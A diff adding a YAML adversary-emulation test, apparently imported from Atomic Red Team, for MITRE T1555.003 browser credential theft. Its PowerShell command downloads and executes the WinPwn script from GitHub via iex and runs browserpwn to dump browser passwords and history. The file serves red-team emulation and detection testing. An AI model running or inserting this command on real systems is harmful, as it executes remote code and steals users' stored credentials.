@@ -1,0 +1,28 @@
+- id: 764ea176-fb71-494c-90ea-72e9d85dce76
+  name: WinPwn - BrowserPwn
+  description: Collect Browser credentials as well as the history via winpwn browserpwn
+    function of WinPwn.
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          browserpwn -consoleoutput -noninteractive
+        cleanup: rm .\System.Data.SQLite.dll -ErrorAction Ignore
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - atomic-red-team
+  - t1555.003
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-02-12T18:57:36.041Z'
+    atomic_guid: 764ea176-fb71-494c-90ea-72e9d85dce76
+    import_timestamp: '2025-06-24T11:15:06.311226Z'
